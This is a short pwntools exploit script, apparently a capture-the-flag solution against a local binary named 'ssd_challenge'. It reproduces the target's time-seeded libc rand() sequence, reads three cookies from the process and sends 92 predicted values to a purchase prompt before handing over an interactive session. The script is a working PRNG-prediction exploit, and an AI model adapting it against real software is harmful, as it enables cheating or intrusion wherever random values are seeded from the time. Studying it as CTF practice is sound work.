#!/usr/bin/env python

from pwn import *
from ctypes import *

context.arch = 'amd64'
context.os = 'linux'
context.word_size = 64

program_name = './ssd_challenge'
binary = ELF(program_name)

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
p = process(program_name)

if __name__ == "__main__":

    seed = libc.time(0) + 2
    libc.srand(seed)

    p.recvuntil('Cookie-')
    cookie1 = p.recvuntil(' -- ').replace('-- ','')
    p.recvuntil('Cookie-')
    cookie2 = p.recvuntil(' -- ').replace('-- ','')
    p.recvuntil('Cookie-')
    cookie3 = p.recvuntil(' -- ').replace('-- ','')

    print libc.rand(),libc.rand(),libc.rand()

    for i in range(95-3):
        FeDEX = libc.rand()
        p.sendlineafter('to buy? ',str(FeDEX))
        print '>>',p.recvline()

    p.interactive()
